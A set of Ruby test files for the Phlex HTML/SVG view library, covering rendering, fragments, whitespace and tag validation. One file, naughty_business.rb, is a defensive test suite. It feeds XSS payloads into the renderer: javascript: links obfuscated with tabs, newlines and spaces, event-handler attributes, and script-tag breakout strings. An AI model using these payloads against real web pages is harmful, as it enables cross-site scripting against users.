10 | 			onclick: safe("window.history.back()"),
11 | 			href: safe("javascript:window.history.back()"),
12 | 		)
13 | 	end
14 |
15 | 	assert_equal_html output, %(<a onclick="window.history.back()" href="javascript:window.history.back()"></a>)
16 | end
17 |
18 | test "element content blocks that return safe values" do
19 | 	output = phlex do
20 | 		script {
21 | 			safe(%(console.log("Hello World");))
22 | 		}
23 | 	end
24 |
25 | 	assert_equal_html output, %(<script>console.log("Hello World");</script>)
26 | end
27 |
28 | test "with invalid input" do
29 | 	error = assert_raises(Phlex::ArgumentError) do
30 | 		phlex { script { safe(123) } }
31 | 	end
32 |
33 | 	assert_equal error.message, "Expected a String."
34 | end
35 |


--------------------------------------------------------------------------------
/quickdraw/sgml/selective_rendering.test.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | class ExampleComponent < Phlex::HTML
  4 | 	def view_template(&)
  5 | 		div(&)
  6 | 	end
  7 | end
  8 |
  9 | class StandardElementExample < Phlex::HTML
 10 | 	def initialize(execution_checker = -> {})
 11 | 		@execution_checker = execution_checker
 12 | 	end
 13 |
 14 | 	def view_template
 15 | 		doctype
 16 | 		div {
 17 | 			comment { h1(id: "target") }
 18 | 			h1 { "Before" }
 19 | 			img(src: "before.jpg")
 20 | 			render ExampleComponent.new { "Should not render" }
 21 | 			whitespace
 22 | 			comment { "This is a comment" }
 23 | 			fragment("target") do
 24 | 				h1(id: "target") {
 25 | 					plain "Hello"
 26 | 					strong { "World" }
 27 | 					img(src: "image.jpg")
 28 | 				}
 29 | 			end
 30 | 			@execution_checker.call
 31 | 			strong { "Here" }
 32 | 			fragment("image") do
 33 | 				img(id: "image", src: "after.jpg")
 34 | 			end
 35 | 			h1(id: "target") { "After" }
 36 | 		}
 37 | 	end
 38 | end
 39 |
 40 | class VoidElementExample < Phlex::HTML
 41 | 	def view_template
 42 | 		doctype
 43 | 		div {
 44 | 			comment { h1(id: "target") }
 45 | 			h1 { "Before" }
 46 | 			img(src: "before.jpg")
 47 | 			whitespace
 48 | 			comment { "This is a comment" }
 49 | 			h1 {
 50 | 				plain "Hello"
 51 | 				strong { "World" }
 52 | 				fragment("target") do
 53 | 					img(id: "target", src: "image.jpg")
 54 | 				end
 55 | 			}
 56 | 			img(src: "after.jpg")
 57 | 			h1(id: "target") { "After" }
 58 | 		}
 59 | 	end
 60 | end
 61 |
 62 | class WithCaptureBlock < Phlex::HTML
 63 | 	def view_template
 64 | 		h1(id: "before") { "Before" }
 65 | 		fragment("around") do
 66 | 			div(id: "around") do
 67 | 				capture do
 68 | 					fragment("inside") do
 69 | 						h1(id: "inside") { "Inside" }
 70 | 					end
 71 | 				end
 72 | 			end
 73 | 		end
 74 | 		fragment("after") do
 75 | 			h1(id: "after") { "After" }
 76 | 		end
 77 | 	end
 78 | end
 79 |
 80 | test "renders the just the target fragment" do
 81 | 	output = StandardElementExample.new.call(fragments: ["target"])
 82 | 	assert_equal_html output, %(<h1 id="target">Hello<strong>World</strong><img src="image.jpg"></h1>)
 83 | end
 84 |
 85 | test "works with void elements" do
 86 | 	output = VoidElementExample.new.call(fragments: ["target"])
 87 | 	assert_equal_html output, %(<img id="target" src="image.jpg">)
 88 | end
 89 |
 90 | test "supports multiple fragments" do
 91 | 	output = StandardElementExample.new.call(fragments: ["target", "image"])
 92 | 	assert_equal_html output, %(<h1 id="target">Hello<strong>World</strong><img src="image.jpg"></h1><img id="image" src="after.jpg">)
 93 | end
 94 |
 95 | test "halts early after all fragments are found" do
 96 | 	called = false
 97 | 	checker = -> { called = true }
 98 | 	StandardElementExample.new(checker).call(fragments: ["target"])
 99 |
100 | 	refute called
101 | end
102 |
103 | test "with a capture block doesn't render the capture block" do
104 | 	output = WithCaptureBlock.new.call(fragments: ["after"])
105 | 	assert_equal_html output, %(<h1 id="after">After</h1>)
106 | end
107 |
108 | test "with a capture block renders the capture block when selected" do
109 | 	output = WithCaptureBlock.new.call(fragments: ["around"])
110 | 	assert_equal_html output, %(<div id="around">&lt;h1 id=&quot;inside&quot;&gt;Inside&lt;/h1&gt;</div>)
111 | end
112 |
113 | test "with a capture block doesn't select from the capture block" do
114 | 	output = WithCaptureBlock.new.call(fragments: ["inside"])
115 | 	assert_equal_html output, ""
116 | end
117 |


--------------------------------------------------------------------------------
/quickdraw/sgml/to_proc.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "sgml_helper"
 4 | include SGMLHelper
 5 |
 6 | class Example < Phlex::HTML
 7 | 	def view_template(&)
 8 | 		article(&)
 9 | 	end
10 |
11 | 	def slot(&)
12 | 		render(&)
13 | 	end
14 | end
15 |
16 | class Sub < Phlex::HTML
17 | 	def view_template
18 | 		h1 { "Sub" }
19 | 	end
20 | end
21 |
22 | test "rendering components via #to_proc" do
23 | 	output = phlex do
24 | 		render Example do |e|
25 | 			e.slot(&Sub.new)
26 | 		end
27 | 	end
28 |
29 | 	assert_equal_html output, %(<article><h1>Sub</h1></article>)
30 | end
31 |


--------------------------------------------------------------------------------
/quickdraw/sgml/whitespace.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | require "sgml_helper"
 4 |
 5 | include SGMLHelper
 6 |
 7 | test "whitespae between" do
 8 | 	output = phlex do
 9 | 		div
10 | 		whitespace
11 | 		div
12 | 	end
13 |
14 | 	assert_equal_html output, %(<div></div> <div></div>)
15 | end
16 |
17 | test "whitespae around" do
18 | 	output = phlex do
19 | 		div
20 | 		whitespace { div }
21 | 		div
22 | 	end
23 |
24 | 	assert_equal_html output, %(<div></div> <div></div> <div></div>)
25 | end
26 |


--------------------------------------------------------------------------------
/quickdraw/svg.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < Phlex::SVG
 4 | 	def view_template
 5 | 		svg do
 6 | 			path(d: "123")
 7 | 		end
 8 | 	end
 9 | end
10 |
11 | test do
12 | 	assert_equal Example.call, %(<svg><path d="123"></path></svg>)
13 | end
14 |
15 | test "content_type" do
16 | 	component = Class.new(Phlex::SVG)
17 | 	assert_equal component.new.content_type, "image/svg+xml"
18 | end
19 |
20 | test "cdata with string" do
21 | 	component = Class.new(Phlex::SVG) do
22 | 		def view_template
23 | 			cdata("Hello, <[[test]]> World!")
24 | 		end
25 | 	end
26 |
27 | 	assert_equal component.call, %(<![CDATA[Hello, <[[test]]>]]<![CDATA[ World!]]>)
28 | end
29 |
30 | test "cdata with block" do
31 | 	component = Class.new(Phlex::SVG) do
32 | 		def view_template
33 | 			cdata do
34 | 				path(d: "123")
35 | 			end
36 | 		end
37 | 	end
38 |
39 | 	assert_equal component.call, %(<![CDATA[<path d="123"></path>]]>)
40 | end
41 |


--------------------------------------------------------------------------------
/quickdraw/svg/standard_elements.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | Phlex::SVG::StandardElements.__registered_elements__.each do |method_name, tag|
 4 | 	test "<#{tag}> with block text content and attributes" do
 5 | 		example = Class.new(Phlex::SVG) do
 6 | 			define_method :view_template do
 7 | 				__send__(method_name, class: "class", id: "id", disabled: true, selected: false) { "content" }
 8 | 			end
 9 | 		end
10 |
11 | 		assert_equal example.call, %(<#{tag} class="class" id="id" disabled>content</#{tag}>)
12 | 	end
13 |
14 | 	test "<#{tag}> with string attribute keys" do
15 | 		example = Class.new(Phlex::SVG) do
16 | 			define_method :view_template do
17 | 				__send__(method_name, "attribute_with_underscore" => true) { "content" }
18 | 			end
19 | 		end
20 |
21 | 		assert_equal example.call, %(<#{tag} attribute_with_underscore>content</#{tag}>)
22 | 	end
23 |
24 | 	test "<#{tag}> with hash attribute values" do
25 | 		example = Class.new(Phlex::SVG) do
26 | 			define_method :view_template do
27 | 				__send__(method_name, aria: { hidden: true }, data_turbo: { frame: "_top" }) { "content" }
28 | 			end
29 | 		end
30 |
31 | 		assert_equal example.call, %(<#{tag} aria-hidden data-turbo-frame="_top">content</#{tag}>)
32 | 	end
33 | end
34 |


--------------------------------------------------------------------------------
/quickdraw/tag.test.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | class HTMLComponent < Phlex::HTML
  4 | 	def initialize(tag, **attributes)
  5 | 		@tag = tag
  6 | 		@attributes = attributes
  7 | 	end
  8 |
  9 | 	def view_template(&)
 10 | 		tag(@tag, **@attributes, &)
 11 | 	end
 12 | end
 13 |
 14 | class SVGComponent < Phlex::SVG
 15 | 	def initialize(tag, **attributes)
 16 | 		@tag = tag
 17 | 		@attributes = attributes
 18 | 	end
 19 |
 20 | 	def view_template(&)
 21 | 		tag(@tag, **@attributes, &)
 22 | 	end
 23 | end
 24 |
 25 | Phlex::HTML::VoidElements.__registered_elements__.each do |method_name, tag|
 26 | 	test "<#{tag}> HTML tag without attributes" do
 27 | 		output = HTMLComponent.call(tag.to_sym)
 28 |
 29 | 		assert_equal_html output, <<~HTML.strip
 30 | 			<#{tag}>
 31 | 		HTML
 32 | 	end
 33 |
 34 | 	test "<#{tag}> HTML tag with attributes" do
 35 | 		output = HTMLComponent.call(tag.to_sym, class: "class", id: "id", disabled: true)
 36 |
 37 | 		assert_equal_html output, <<~HTML.strip
 38 | 			<#{tag} class="class" id="id" disabled>
 39 | 		HTML
 40 | 	end
 41 |
 42 | 	test "<#{tag}> HTML tag with content" do
 43 | 		error = assert_raises Phlex::ArgumentError do
 44 | 			HTMLComponent.call(tag.to_sym) do
 45 | 				"Hello, world!"
 46 | 			end
 47 | 		end
 48 |
 49 | 		assert_equal error.message, "Void elements cannot have content blocks."
 50 | 	end
 51 | end
 52 |
 53 | Phlex::HTML::StandardElements.__registered_elements__.each do |method_name, tag|
 54 | 	test "<#{tag}> HTML tag without attributes" do
 55 | 		output = HTMLComponent.call(tag.to_sym)
 56 |
 57 | 		assert_equal_html output, <<~HTML.strip
 58 | 			<#{tag}></#{tag}>
 59 | 		HTML
 60 | 	end
 61 |
 62 | 	test "<#{tag}> HTML tag with attributes" do
 63 | 		output = HTMLComponent.call(tag.to_sym, class: "class", id: "id", disabled: true)
 64 |
 65 | 		assert_equal_html output, <<~HTML.strip
 66 | 			<#{tag} class="class" id="id" disabled></#{tag}>
 67 | 		HTML
 68 | 	end
 69 |
 70 | 	test "<#{tag}> HTML tag with content" do
 71 | 		output = HTMLComponent.call(tag.to_sym) do
 72 | 			"Hello, world!"
 73 | 		end
 74 |
 75 | 		assert_equal_html output, <<~HTML.strip
 76 | 			<#{tag}>Hello, world!</#{tag}>
 77 | 		HTML
 78 | 	end
 79 |
 80 | 	test "<#{tag}> HTML tag with content and attributes" do
 81 | 		output = HTMLComponent.call(tag.to_sym, class: "class", id: "id", disabled: true) do
 82 | 			"Hello, world!"
 83 | 		end
 84 |
 85 | 		assert_equal_html output, <<~HTML.strip
 86 | 			<#{tag} class="class" id="id" disabled>Hello, world!</#{tag}>
 87 | 		HTML
 88 | 	end
 89 | end
 90 |
 91 | Phlex::SVG::StandardElements.__registered_elements__.each do |method_name, tag|
 92 | 	test "<#{tag}> SVG tag without attributes" do
 93 | 		output = SVGComponent.call(tag.to_sym)
 94 |
 95 | 		assert_equal_html output, <<~HTML.strip
 96 | 			<#{tag}></#{tag}>
 97 | 		HTML
 98 | 	end
 99 |
100 | 	test "<#{tag}> SVG tag with attributes" do
101 | 		output = SVGComponent.call(tag.to_sym, class: "class", id: "id", disabled: true)
102 |
103 | 		assert_equal_html output, <<~HTML.strip
104 | 			<#{tag} class="class" id="id" disabled></#{tag}>
105 | 		HTML
106 | 	end
107 |
108 | 	test "<#{tag}> SVG tag with content" do
109 | 		output = SVGComponent.call(tag.to_sym) do
110 | 			"Hello, world!"
111 | 		end
112 |
113 | 		assert_equal_html output, <<~HTML.strip
114 | 			<#{tag}>Hello, world!</#{tag}>
115 | 		HTML
116 | 	end
117 |
118 | 	test "<#{tag}> SVG tag with content and attributes" do
119 | 		output = SVGComponent.call(tag.to_sym, class: "class", id: "id", disabled: true) do
120 | 			"Hello, world!"
121 | 		end
122 |
123 | 		assert_equal_html output, <<~HTML.strip
124 | 			<#{tag} class="class" id="id" disabled>Hello, world!</#{tag}>
125 | 		HTML
126 | 	end
127 | end
128 |
129 | test "svg tag in HTML" do
130 | 	output = HTMLComponent.call(:svg) do |svg|
131 | 		svg.circle(cx: 50, cy: 50, r: 40, fill: "red")
132 | 	end
133 |
134 | 	assert_equal_html output, <<~HTML.strip
135 | 		<svg><circle cx="50" cy="50" r="40" fill="red"></circle></svg>
136 | 	HTML
137 | end
138 |
139 | test "with invalid tag name" do
140 | 	error = assert_raises Phlex::ArgumentError do
141 | 		HTMLComponent.call(:invalidtag)
142 | 	end
143 |
144 | 	assert_equal error.message, "Invalid HTML tag: invalidtag"
145 | end
146 |
147 | test "with invalid tag name input type" do
148 | 	error = assert_raises Phlex::ArgumentError do
149 | 		HTMLComponent.call("div")
150 | 	end
151 |
152 | 	assert_equal error.message, "Expected the tag name to be a Symbol."
153 | end
154 |
155 | test "with custom tag name" do
156 | 	output = HTMLComponent.call(:custom_tag)
157 |
158 | 	assert_equal_html output, <<~HTML.strip
159 | 		<custom-tag></custom-tag>
160 | 	HTML
161 | end
162 |


--------------------------------------------------------------------------------
/quickdraw/💪.test.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | class Example < 💪::HTML
 4 | 	def view_template
 5 | 		h1 { "💪" }
 6 | 	end
 7 | end
 8 |
 9 | test "💪" do
10 | 	assert_equal_html Example.new.call, %(<h1>💪</h1>)
11 | end
12 |


--------------------------------------------------------------------------------
/test/phlex/view/custom_elements.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | describe Phlex::HTML do
 4 | 	extend ViewHelper
 5 |
 6 | 	with "custom elements" do
 7 | 		view do
 8 | 			register_element :trix_editor
 9 | 			register_element :trix_toolbar
10 |
11 | 			def view_template
12 | 				div do
13 | 					trix_toolbar
14 | 					trix_editor { "Hello" }
15 | 				end
16 | 			end
17 | 		end
18 |
19 | 		it "produces the correct markup" do
20 | 			expect(output).to be ==
21 | 				"<div><trix-toolbar></trix-toolbar><trix-editor>Hello</trix-editor></div>"
22 | 		end
23 | 	end
24 | end
25 |


--------------------------------------------------------------------------------
/test/phlex/view/lowercase_symbolic_id_guard.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | describe Phlex::SGML do
 4 | 	extend ViewHelper
 5 |
 6 | 	with "non lowercase id" do
 7 | 		view do
 8 | 			def view_template
 9 | 				div(iD: "a")
10 | 			end
11 | 		end
12 |
13 | 		it "raises" do
14 | 			expect { output }.to raise_exception(Phlex::ArgumentError)
15 | 		end
16 | 	end
17 |
18 | 	with "non symbolic id" do
19 | 		view do
20 | 			def view_template
21 | 				div("id" => "a")
22 | 			end
23 | 		end
24 |
25 | 		it "raises" do
26 | 			expect { output }.to raise_exception(Phlex::ArgumentError)
27 | 		end
28 | 	end
29 | end
30 |


--------------------------------------------------------------------------------
/test/phlex/view/naughty_business.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | describe Phlex::HTML do
  4 | 	extend ViewHelper
  5 |
  6 | 	with "naughty javascript links" do
  7 | 		view do
  8 | 			def view_template
  9 | 				a(href: "javascript:alert(1)") { "a" }
 10 | 				a(href: "JAVASCRIPT:alert(1)") { "b" }
 11 | 				a(href: :"JAVASCRIPT:alert(1)") { "c" }
 12 | 				a(HREF: "javascript:alert(1)") { "d" }
 13 | 			end
 14 | 		end
 15 |
 16 | 		it "removes the href attributes" do
 17 | 			expect(output).to be == "<a>a</a><a>b</a><a>c</a><a>d</a>"
 18 | 		end
 19 | 	end
 20 |
 21 | 	with "naughty uppercase event tag" do
 22 | 		view do
 23 | 			def view_template
 24 | 				button ONCLICK: "ALERT(1)" do
 25 | 					"naughty button"
 26 | 				end
 27 | 			end
 28 | 		end
 29 |
 30 | 		it "raises" do
 31 | 			expect { output }.to raise_exception ArgumentError,
 32 | 				message: be == "Unsafe attribute name detected: ONCLICK."
 33 | 		end
 34 | 	end
 35 |
 36 | 	with "naughty text" do
 37 | 		view do
 38 | 			def view_template
 39 | 				plain %("><script type="text/javascript" src="bad_script.js"></script>)
 40 | 			end
 41 | 		end
 42 |
 43 | 		it "escapes the content" do
 44 | 			expect(output).to be == "&quot;&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;bad_script.js&quot;&gt;&lt;/script&gt;"
 45 | 		end
 46 | 	end
 47 |
 48 | 	with "naughty tag attribute values" do
 49 | 		view do
 50 | 			def view_template
 51 | 				article id: %("><script type="text/javascript" src="bad_script.js"></script>)
 52 | 			end
 53 | 		end
 54 |
 55 | 		it "escapes the attributes" do
 56 | 			expect(output).to be == %(<article id="&quot;><script type=&quot;text/javascript&quot; src=&quot;bad_script.js&quot;></script>"></article>)
 57 | 		end
 58 | 	end
 59 |
 60 | 	with "naughty javascript link protocol in href" do
 61 | 		view do
 62 | 			def view_template
 63 | 				a href: "javascript:javascript:alert(1)" do
 64 | 					"naughty link"
 65 | 				end
 66 | 			end
 67 | 		end
 68 |
 69 | 		it "strips the javascript protocol" do
 70 | 			expect(output).to be == %{<a>naughty link</a>}
 71 | 		end
 72 | 	end
 73 |
 74 | 	with "naughty javascript link protocol in href" do
 75 | 		view do
 76 | 			def view_template
 77 | 				a "href" => "javascript:javascript:alert(1)" do
 78 | 					"naughty link"
 79 | 				end
 80 | 			end
 81 | 		end
 82 |
 83 | 		it "strips the javascript protocol" do
 84 | 			expect(output).to be == %{<a>naughty link</a>}
 85 | 		end
 86 | 	end
 87 |
 88 | 	with "naughty javascript link protocol with a hidden tab character" do
 89 | 		view do
 90 | 			def view_template
 91 | 				a(href: "\tjavascript:alert(1)") { "XSS" }
 92 | 				a(href: "j\tavascript:alert(1)") { "XSS" }
 93 | 				a(href: "ja\tvascript:alert(1)") { "XSS" }
 94 | 				a(href: "jav\tascript:alert(1)") { "XSS" }
 95 | 				a(href: "java\tscript:alert(1)") { "XSS" }
 96 | 				a(href: "javas\tcript:alert(1)") { "XSS" }
 97 | 				a(href: "javasc\tript:alert(1)") { "XSS" }
 98 | 				a(href: "javascr\tipt:alert(1)") { "XSS" }
 99 | 				a(href: "javascri\tpt:alert(1)") { "XSS" }
100 | 				a(href: "javascrip\tt:alert(1)") { "XSS" }
101 | 				a(href: "javascript\t:alert(1)") { "XSS" }
102 | 				a(href: "javascript:\talert(1)") { "XSS" }
103 | 			end
104 | 		end
105 |
106 | 		it "strips the javascript protocol" do
107 | 			expect(output.scan("<a>").size).to be == 12
108 | 			expect(output.scan("href").size).to be == 0
109 | 		end
110 | 	end
111 |
112 | 	with "naughty javascript link protocol with a hidden newline character" do
113 | 		view do
114 | 			def view_template
115 | 				a(href: "\njavascript:alert(1)") { "XSS" }
116 | 				a(href: "j\navascript:alert(1)") { "XSS" }
117 | 				a(href: "ja\nvascript:alert(1)") { "XSS" }
118 | 				a(href: "jav\nascript:alert(1)") { "XSS" }
119 | 				a(href: "java\nscript:alert(1)") { "XSS" }
120 | 				a(href: "javas\ncript:alert(1)") { "XSS" }
121 | 				a(href: "javasc\nript:alert(1)") { "XSS" }
122 | 				a(href: "javascr\nipt:alert(1)") { "XSS" }
123 | 				a(href: "javascri\npt:alert(1)") { "XSS" }
124 | 				a(href: "javascrip\nt:alert(1)") { "XSS" }
125 | 				a(href: "javascript\n:alert(1)") { "XSS" }
126 | 				a(href: "javascript:\nalert(1)") { "XSS" }
127 | 			end
128 | 		end
129 |
130 | 		it "strips the javascript protocol" do
131 | 			expect(output.scan("<a>").size).to be == 12
132 | 			expect(output.scan("href").size).to be == 0
133 | 		end
134 | 	end
135 |
136 | 	with "naughty javascript link protocol with a hidden whitespace character" do
137 | 		view do
138 | 			def view_template
139 | 				a(href: " javascript:alert(1)") { "XSS" }
140 | 				a(href: "j avascript:alert(1)") { "XSS" }
141 | 				a(href: "ja vascript:alert(1)") { "XSS" }
142 | 				a(href: "jav ascript:alert(1)") { "XSS" }
143 | 				a(href: "java script:alert(1)") { "XSS" }
144 | 				a(href: "javas cript:alert(1)") { "XSS" }
145 | 				a(href: "javasc ript:alert(1)") { "XSS" }
146 | 				a(href: "javascr ipt:alert(1)") { "XSS" }
147 | 				a(href: "javascri pt:alert(1)") { "XSS" }
148 | 				a(href: "javascrip t:alert(1)") { "XSS" }
149 | 				a(href: "javascript :alert(1)") { "XSS" }
150 | 				a(href: "javascript: alert(1)") { "XSS" }
151 | 			end
152 | 		end
153 |
154 | 		it "strips the javascript protocol" do
155 | 			expect(output.scan("<a>").size).to be == 12
156 | 			expect(output.scan("href").size).to be == 0
157 | 		end
158 | 	end
159 |
160 | 	Phlex::SGML::UNSAFE_ATTRIBUTES.each do |event_attribute|
161 | 		with "with naughty #{event_attribute} attribute" do
162 | 			naughty_attributes = { event_attribute => "alert(1);" }
163 |
164 | 			view do
165 | 				define_method :view_template do
166 | 					__send__(:div, **naughty_attributes)
167 | 				end
168 | 			end
169 |
170 | 			it "raises an ArgumentError" do
171 | 				expect { output }.to raise_exception ArgumentError,
172 | 					message: be == "Unsafe attribute name detected: #{event_attribute}."
173 | 			end
174 | 		end
175 | 	end
176 |
177 | 	%w[< > & " '].each do |naughty_character|
178 | 		with "naughty attribute name containing #{naughty_character}" do
179 | 			naughty_attribute = "abc#{naughty_character}123"
180 | 			naughty_attributes = { naughty_attribute => "alert(1);" }
181 |
182 | 			view do
183 | 				define_method :view_template do
184 | 					__send__(:div, **naughty_attributes)
185 | 				end
186 | 			end
187 |
188 | 			it "raises an ArgumentError" do
189 | 				expect { output }.to raise_exception ArgumentError,
190 | 					message: be == "Unsafe attribute name detected: #{naughty_attribute}."
191 | 			end
192 | 		end
193 | 	end
194 | end
195 |


--------------------------------------------------------------------------------
